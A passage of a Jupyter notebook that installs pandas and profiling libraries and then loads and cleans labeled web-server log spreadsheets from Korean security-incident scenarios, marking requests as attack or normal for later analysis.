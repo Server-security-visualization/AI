{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pandas\n",
      "  Downloading pandas-2.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (12.3 MB)\n",
      "\u001b[K     |████████████████████████████████| 12.3 MB 9.7 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting openpyxl\n",
      "  Downloading openpyxl-3.1.2-py2.py3-none-any.whl (249 kB)\n",
      "\u001b[K     |████████████████████████████████| 249 kB 75.4 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting tqdm\n",
      "  Downloading tqdm-4.65.0-py3-none-any.whl (77 kB)\n",
      "\u001b[K     |████████████████████████████████| 77 kB 14.8 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting pandas-profiling\n",
      "  Downloading pandas_profiling-3.6.6-py2.py3-none-any.whl (324 kB)\n",
      "\u001b[K     |████████████████████████████████| 324 kB 62.9 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: python-dateutil>=2.8.2 in /usr/local/lib/python3.8/dist-packages (from pandas) (2.8.2)\n",
      "Collecting pytz>=2020.1\n",
      "  Downloading pytz-2023.3-py2.py3-none-any.whl (502 kB)\n",
      "\u001b[K     |████████████████████████████████| 502 kB 68.6 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting tzdata>=2022.1\n",
      "  Downloading tzdata-2023.3-py2.py3-none-any.whl (341 kB)\n",
      "\u001b[K     |████████████████████████████████| 341 kB 69.5 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: numpy>=1.20.3; python_version < \"3.10\" in /usr/local/lib/python3.8/dist-packages (from pandas) (1.23.4)\n",
      "Collecting et-xmlfile\n",
      "  Downloading et_xmlfile-1.1.0-py3-none-any.whl (4.7 kB)\n",
      "Collecting ydata-profiling\n",
      "  Downloading ydata_profiling-4.1.2-py2.py3-none-any.whl (345 kB)\n",
      "\u001b[K     |████████████████████████████████| 345 kB 48.4 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: six>=1.5 in /usr/lib/python3/dist-packages (from python-dateutil>=2.8.2->pandas) (1.14.0)\n",
      "Collecting multimethod<1.10,>=1.4\n",
      "  Downloading multimethod-1.9.1-py3-none-any.whl (10 kB)\n",
      "Collecting phik<0.13,>=0.11.1\n",
      "  Downloading phik-0.12.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (679 kB)\n",
      "\u001b[K     |████████████████████████████████| 679 kB 54.5 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting visions[type_image_path]==0.7.5\n",
      "  Downloading visions-0.7.5-py3-none-any.whl (102 kB)\n",
      "\u001b[K     |████████████████████████████████| 102 kB 93.7 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting PyYAML<6.1,>=5.0.0\n",
      "  Downloading PyYAML-6.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_12_x86_64.manylinux2010_x86_64.whl (701 kB)\n",
      "\u001b[K     |████████████████████████████████| 701 kB 70.8 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: jinja2<3.2,>=2.11.1 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (3.1.2)\n",
      "Collecting typeguard<2.14,>=2.13.2\n",
      "  Downloading typeguard-2.13.3-py3-none-any.whl (17 kB)\n",
      "Collecting requests<2.29,>=2.24.0\n",
      "  Downloading requests-2.28.2-py3-none-any.whl (62 kB)\n",
      "\u001b[K     |████████████████████████████████| 62 kB 4.2 MB/s  eta 0:00:01\n",
      "\u001b[?25hCollecting seaborn<0.13,>=0.10.1\n",
      "  Downloading seaborn-0.12.2-py3-none-any.whl (293 kB)\n",
      "\u001b[K     |████████████████████████████████| 293 kB 58.1 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting statsmodels<0.14,>=0.13.2\n",
      "  Downloading statsmodels-0.13.5-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (9.9 MB)\n",
      "\u001b[K     |████████████████████████████████| 9.9 MB 80.9 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting pydantic<1.11,>=1.8.1\n",
      "  Downloading pydantic-1.10.7-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.2 MB)\n",
      "\u001b[K     |████████████████████████████████| 3.2 MB 42.4 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: matplotlib<3.7,>=3.2 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (3.6.2)\n",
      "Collecting scipy<1.10,>=1.4.1\n",
      "  Downloading scipy-1.9.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (33.8 MB)\n",
      "\u001b[K     |████████████████████████████████| 33.8 MB 71.8 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting htmlmin==0.1.12\n",
      "  Downloading htmlmin-0.1.12.tar.gz (19 kB)\n",
      "Collecting imagehash==4.3.1\n",
      "  Downloading ImageHash-4.3.1-py2.py3-none-any.whl (296 kB)\n",
      "\u001b[K     |████████████████████████████████| 296 kB 57.8 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting joblib>=0.14.1\n",
      "  Downloading joblib-1.2.0-py3-none-any.whl (297 kB)\n",
      "\u001b[K     |████████████████████████████████| 297 kB 73.6 MB/s eta 0:00:01\n",
      "\u001b[?25hCollecting tangled-up-in-unicode>=0.0.4\n",
      "  Downloading tangled_up_in_unicode-0.2.0-py3-none-any.whl (4.7 MB)\n",
      "\u001b[K     |████████████████████████████████| 4.7 MB 51.6 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: attrs>=19.3.0 in /usr/local/lib/python3.8/dist-packages (from visions[type_image_path]==0.7.5->ydata-profiling->pandas-profiling) (22.1.0)\n",
      "Collecting networkx>=2.4\n",
      "  Downloading networkx-3.1-py3-none-any.whl (2.1 MB)\n",
      "\u001b[K     |████████████████████████████████| 2.1 MB 73.5 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: Pillow; extra == \"type_image_path\" in /usr/local/lib/python3.8/dist-packages (from visions[type_image_path]==0.7.5->ydata-profiling->pandas-profiling) (9.3.0)\n",
      "Requirement already satisfied: MarkupSafe>=2.0 in /usr/local/lib/python3.8/dist-packages (from jinja2<3.2,>=2.11.1->ydata-profiling->pandas-profiling) (2.1.1)\n",
      "Collecting charset-normalizer<4,>=2\n",
      "  Downloading charset_normalizer-3.1.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (195 kB)\n",
      "\u001b[K     |████████████████████████████████| 195 kB 76.1 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/lib/python3/dist-packages (from requests<2.29,>=2.24.0->ydata-profiling->pandas-profiling) (1.25.8)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests<2.29,>=2.24.0->ydata-profiling->pandas-profiling) (2019.11.28)\n",
      "Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests<2.29,>=2.24.0->ydata-profiling->pandas-profiling) (2.8)\n",
      "Collecting patsy>=0.5.2\n",
      "  Downloading patsy-0.5.3-py2.py3-none-any.whl (233 kB)\n",
      "\u001b[K     |████████████████████████████████| 233 kB 74.0 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: packaging>=21.3 in /usr/local/lib/python3.8/dist-packages (from statsmodels<0.14,>=0.13.2->ydata-profiling->pandas-profiling) (21.3)\n",
      "Requirement already satisfied: typing-extensions>=4.2.0 in /usr/local/lib/python3.8/dist-packages (from pydantic<1.11,>=1.8.1->ydata-profiling->pandas-profiling) (4.4.0)\n",
      "Requirement already satisfied: contourpy>=1.0.1 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (1.0.6)\n",
      "Requirement already satisfied: fonttools>=4.22.0 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (4.38.0)\n",
      "Requirement already satisfied: pyparsing>=2.2.1 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (3.0.9)\n",
      "Requirement already satisfied: kiwisolver>=1.0.1 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (1.4.4)\n",
      "Requirement already satisfied: cycler>=0.10 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (0.11.0)\n",
      "Collecting PyWavelets\n",
      "  Downloading PyWavelets-1.4.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (6.9 MB)\n",
      "\u001b[K     |████████████████████████████████| 6.9 MB 78.8 MB/s eta 0:00:01\n",
      "\u001b[?25hBuilding wheels for collected packages: htmlmin\n",
      "  Building wheel for htmlmin (setup.py) ... \u001b[?25ldone\n",
      "\u001b[?25h  Created wheel for htmlmin: filename=htmlmin-0.1.12-py3-none-any.whl size=27080 sha256=08346706974accdf76370e51c5f242863f0a0849560049e92390672d82edcf55\n",
      "  Stored in directory: /root/.cache/pip/wheels/23/14/6e/4be5bfeeb027f4939a01764b48edd5996acf574b0913fe5243\n",
      "Successfully built htmlmin\n",
      "Installing collected packages: pytz, tzdata, pandas, et-xmlfile, openpyxl, tqdm, multimethod, joblib, scipy, phik, tangled-up-in-unicode, networkx, PyWavelets, imagehash, visions, PyYAML, typeguard, charset-normalizer, requests, seaborn, patsy, statsmodels, pydantic, htmlmin, ydata-profiling, pandas-profiling\n",
      "  Attempting uninstall: requests\n",
      "    Found existing installation: requests 2.22.0\n",
      "    Uninstalling requests-2.22.0:\n",
      "      Successfully uninstalled requests-2.22.0\n",
      "\u001b[31mERROR: After October 2020 you may experience errors when installing or updating packages. This is because pip will change the way that it resolves dependency conflicts.\n",
      "\n",
      "We recommend you use --use-feature=2020-resolver to test your packages with the new resolver before it becomes the default.\n",
      "\n",
      "ydata-profiling 4.1.2 requires pandas!=1.4.0,<1.6,>1.1, but you'll have pandas 2.0.1 which is incompatible.\n",
      "ydata-profiling 4.1.2 requires tqdm<4.65,>=4.48.2, but you'll have tqdm 4.65.0 which is incompatible.\u001b[0m\n",
      "Successfully installed PyWavelets-1.4.1 PyYAML-6.0 charset-normalizer-3.1.0 et-xmlfile-1.1.0 htmlmin-0.1.12 imagehash-4.3.1 joblib-1.2.0 multimethod-1.9.1 networkx-3.1 openpyxl-3.1.2 pandas-2.0.1 pandas-profiling-3.6.6 patsy-0.5.3 phik-0.12.3 pydantic-1.10.7 pytz-2023.3 requests-2.28.2 scipy-1.9.3 seaborn-0.12.2 statsmodels-0.13.5 tangled-up-in-unicode-0.2.0 tqdm-4.65.0 typeguard-2.13.3 tzdata-2023.3 visions-0.7.5 ydata-profiling-4.1.2\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mWARNING: You are using pip version 20.2.4; however, version 23.1.2 is available.\r\n",
      "You should consider upgrading via the '/usr/bin/python3 -m pip install --upgrade pip' command.\u001b[0m\r\n"
     ]
    }
   ],
   "source": [
    "!pip3 install pandas openpyxl tqdm pandas-profiling"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Import and PATH setting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import matplotlib.pyplot as plt\n",
    "from glob import glob\n",
    "from tqdm import tqdm\n",
    "from ydata_profiling import ProfileReport\n",
    "\n",
    "%matplotlib inline "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "DATAPATH = \"./dataset\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Preprocessing"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Excel Load"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['./dataset/WEB.Teamviewer.이용.업데이트.서버.해킹사고/3-09-WEB_IIS-LBL.xlsx',\n",
       " './dataset/WEB.홈페이지를.통한.내부망.장악/3-01-WEB_IIS-LBL.xlsx',\n",
       " './dataset/WEB.Apache.WAS(Tomcat).취약점.악용.권한.탈취.사고/3-14-WEB_Apache-LBL.xlsx',\n",
       " './dataset/WEB.IIS.SQL.Injection.취약점.악용.데이터.유출.사고/3-13-WEB_IIS-LBL.xlsx',\n",
       " './dataset/WEB.유닉스.취약점.악용.및.랜섬웨어.감염/3-02-WEB_Apache-LBL.xlsx']"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "excels_path = glob(f\"{DATAPATH}/*/*LBL*\")\n",
    "excels_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 5/5 [00:07<00:00,  1.41s/it]\n"
     ]
    }
   ],
   "source": [
    "web_df = pd.DataFrame()\n",
    "\n",
    "for excel_path in tqdm(excels_path):\n",
    "    df = pd.read_excel(excel_path, engine='openpyxl')\n",
    "    web_df = pd.concat([web_df, df])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>rn</th>\n",
       "      <th>event_time</th>\n",
       "      <th>s_ip</th>\n",
       "      <th>s_port</th>\n",
       "      <th>s_country</th>\n",
       "      <th>d_ip</th>\n",
       "      <th>d_port</th>\n",
       "      <th>d_country</th>\n",
       "      <th>direction</th>\n",
       "      <th>http_method</th>\n",
       "      <th>...</th>\n",
       "      <th>pkt_bytes</th>\n",
       "      <th>rcvd_bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>sent_bytes</th>\n",
       "      <th>user_agent</th>\n",
       "      <th>label_attack</th>\n",
       "      <th>label_mitre</th>\n",
       "      <th>label_scenario</th>\n",
       "      <th>Unnamed: 20</th>\n",
       "      <th>Unnamed: 21</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>10/28/21 2:27</td>\n",
       "      <td>10.0.0.1</td>\n",
       "      <td>0</td>\n",
       "      <td>KR</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5547</td>\n",
       "      <td>480.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>attack</td>\n",
       "      <td>T1204.002</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2</td>\n",
       "      <td>10/28/21 2:27</td>\n",
       "      <td>10.0.0.1</td>\n",
       "      <td>0</td>\n",
       "      <td>KR</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5547</td>\n",
       "      <td>480.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>attack</td>\n",
       "      <td>T1204.002</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>3</td>\n",
       "      <td>10/28/21 2:27</td>\n",
       "      <td>10.0.0.1</td>\n",
       "      <td>0</td>\n",
       "      <td>KR</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5549</td>\n",
       "      <td>423.0</td>\n",
       "      <td>http://218.49.112.115/Client.txt</td>\n",
       "      <td>5549.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>attack</td>\n",
       "      <td>T1204.002</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>4</td>\n",
       "      <td>10/28/21 2:28</td>\n",
       "      <td>10.0.0.1</td>\n",
       "      <td>0</td>\n",
       "      <td>KR</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5547</td>\n",
       "      <td>506.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>attack</td>\n",
       "      <td>T1204.002</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>5</td>\n",
       "      <td>10/29/21 5:30</td>\n",
       "      <td>172.16.1.72</td>\n",
       "      <td>0</td>\n",
       "      <td>-</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>1</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5546</td>\n",
       "      <td>267.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5546.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>normal</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 24 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "   rn     event_time         s_ip  s_port s_country         d_ip  d_port   \n",
       "0   1  10/28/21 2:27     10.0.0.1       0        KR  172.16.1.60      80  \\\n",
       "1   2  10/28/21 2:27     10.0.0.1       0        KR  172.16.1.60      80   \n",
       "2   3  10/28/21 2:27     10.0.0.1       0        KR  172.16.1.60      80   \n",
       "3   4  10/28/21 2:28     10.0.0.1       0        KR  172.16.1.60      80   \n",
       "4   5  10/29/21 5:30  172.16.1.72       0         -  172.16.1.60      80   \n",
       "\n",
       "  d_country  direction http_method  ... pkt_bytes rcvd_bytes   \n",
       "0         -          3         GET  ...      5547      480.0  \\\n",
       "1         -          3         GET  ...      5547      480.0   \n",
       "2         -          3         GET  ...      5549      423.0   \n",
       "3         -          3         GET  ...      5547      506.0   \n",
       "4         -          1         GET  ...      5546      267.0   \n",
       "\n",
       "                            referer  sent_bytes   \n",
       "0                                 -      5547.0  \\\n",
       "1                                 -      5547.0   \n",
       "2  http://218.49.112.115/Client.txt      5549.0   \n",
       "3                                 -      5547.0   \n",
       "4                                 -      5546.0   \n",
       "\n",
       "                                          user_agent  label_attack   \n",
       "0  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        attack  \\\n",
       "1  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        attack   \n",
       "2  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        attack   \n",
       "3  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        attack   \n",
       "4  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        normal   \n",
       "\n",
       "  label_mitre  label_scenario Unnamed: 20 Unnamed: 21  \n",
       "0   T1204.002               -         NaN         NaN  \n",
       "1   T1204.002               -         NaN         NaN  \n",
       "2   T1204.002               -         NaN         NaN  \n",
       "3   T1204.002               -         NaN         NaN  \n",
       "4           -               -         NaN         NaN  \n",
       "\n",
       "[5 rows x 24 columns]"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Index: 40182 entries, 0 to 543\n",
      "Data columns (total 24 columns):\n",
      " #   Column          Non-Null Count  Dtype  \n",
      "---  ------          --------------  -----  \n",
      " 0   rn              40182 non-null  int64  \n",
      " 1   event_time      40182 non-null  object \n",
      " 2   s_ip            40182 non-null  object \n",
      " 3   s_port          40182 non-null  int64  \n",
      " 4   s_country       40182 non-null  object \n",
      " 5   d_ip            40182 non-null  object \n",
      " 6   d_port          40182 non-null  int64  \n",
      " 7   d_country       40182 non-null  object \n",
      " 8   direction       40182 non-null  int64  \n",
      " 9   http_method     40182 non-null  object \n",
      " 10  http_query      23626 non-null  object \n",
      " 11  http_version    40182 non-null  object \n",
      " 12  http_url        40182 non-null  object \n",
      " 13  http_status     40182 non-null  int64  \n",
      " 14  pkt_bytes       40182 non-null  int64  \n",
      " 15  rcvd_bytes      2318 non-null   float64\n",
      " 16  referer         40182 non-null  object \n",
      " 17  sent_bytes      13444 non-null  float64\n",
      " 18  user_agent      40182 non-null  object \n",
      " 19  label_attack    40182 non-null  object \n",
      " 20  label_mitre     40182 non-null  object \n",
      " 21  label_scenario  40182 non-null  object \n",
      " 22  Unnamed: 20     0 non-null      float64\n",
      " 23  Unnamed: 21     1 non-null      object \n",
      "dtypes: float64(3), int64(6), object(15)\n",
      "memory usage: 7.7+ MB\n"
     ]
    }
   ],
   "source": [
    "web_df.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df = web_df.reset_index()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 필요없는 열 삭제"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "index                 0\n",
       "rn                    0\n",
       "event_time            0\n",
       "s_ip                  0\n",
       "s_port                0\n",
       "s_country             0\n",
       "d_ip                  0\n",
       "d_port                0\n",
       "d_country             0\n",
       "direction             0\n",
       "http_method           0\n",
       "http_query        16556\n",
       "http_version          0\n",
       "http_url              0\n",
       "http_status           0\n",
       "pkt_bytes             0\n",
       "rcvd_bytes        37864\n",
       "referer               0\n",
       "sent_bytes        26738\n",
       "user_agent            0\n",
       "label_attack          0\n",
       "label_mitre           0\n",
       "label_scenario        0\n",
       "Unnamed: 20       40182\n",
       "Unnamed: 21       40181\n",
       "dtype: int64"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df.isnull().sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df.drop(['index', 'rn', 'event_time', 's_ip', 's_port', 's_country', 'd_ip', 'd_port',\n",
    "             'd_country', 'user_agent', 'label_mitre', 'label_scenario',\n",
    "             'Unnamed: 20','Unnamed: 21'], axis=1, inplace=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>direction</th>\n",
       "      <th>http_method</th>\n",
       "      <th>http_query</th>\n",
       "      <th>http_version</th>\n",
       "      <th>http_url</th>\n",
       "      <th>http_status</th>\n",
       "      <th>pkt_bytes</th>\n",
       "      <th>rcvd_bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>sent_bytes</th>\n",
       "      <th>label_attack</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/Client.txt</td>\n",
       "      <td>404</td>\n",
       "      <td>5547</td>\n",
       "      <td>480.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>attack</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/Client.txt</td>\n",
       "      <td>404</td>\n",
       "      <td>5547</td>\n",
       "      <td>480.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>attack</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/favicon.ico</td>\n",
       "      <td>404</td>\n",
       "      <td>5549</td>\n",
       "      <td>423.0</td>\n",
       "      <td>http://218.49.112.115/Client.txt</td>\n",
       "      <td>5549.0</td>\n",
       "      <td>attack</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/Client.txt</td>\n",
       "      <td>404</td>\n",
       "      <td>5547</td>\n",
       "      <td>506.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>attack</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/favicon.ico</td>\n",
       "      <td>404</td>\n",
       "      <td>5546</td>\n",
       "      <td>267.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5546.0</td>\n",
       "      <td>normal</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   direction http_method http_query http_version      http_url  http_status   \n",
       "0          3         GET          -     HTTP/1.1   /Client.txt          404  \\\n",
       "1          3         GET          -     HTTP/1.1   /Client.txt          404   \n",
       "2          3         GET          -     HTTP/1.1  /favicon.ico          404   \n",
       "3          3         GET          -     HTTP/1.1   /Client.txt          404   \n",
       "4          1         GET          -     HTTP/1.1  /favicon.ico          404   \n",
       "\n",
       "   pkt_bytes  rcvd_bytes                           referer  sent_bytes   \n",
       "0       5547       480.0                                 -      5547.0  \\\n",
       "1       5547       480.0                                 -      5547.0   \n",
       "2       5549       423.0  http://218.49.112.115/Client.txt      5549.0   \n",
       "3       5547       506.0                                 -      5547.0   \n",
       "4       5546       267.0                                 -      5546.0   \n",
       "\n",
       "  label_attack  \n",
       "0       attack  \n",
       "1       attack  \n",
       "2       attack  \n",
       "3       attack  \n",
       "4       normal  "
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 40182 entries, 0 to 40181\n",
      "Data columns (total 11 columns):\n",
      " #   Column        Non-Null Count  Dtype  \n",
      "---  ------        --------------  -----  \n",
      " 0   direction     40182 non-null  int64  \n",
      " 1   http_method   40182 non-null  object \n",
      " 2   http_query    23626 non-null  object \n",
      " 3   http_version  40182 non-null  object \n",
      " 4   http_url      40182 non-null  object \n",
      " 5   http_status   40182 non-null  int64  \n",
      " 6   pkt_bytes     40182 non-null  int64  \n",
      " 7   rcvd_bytes    2318 non-null   float64\n",
      " 8   referer       40182 non-null  object \n",
      " 9   sent_bytes    13444 non-null  float64\n",
      " 10  label_attack  40182 non-null  object \n",
      "dtypes: float64(2), int64(3), object(6)\n",
      "memory usage: 3.4+ MB\n"
     ]
    }
   ],
   "source": [
    "web_df.info()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## null 값 대체"
   ]
  },
  {
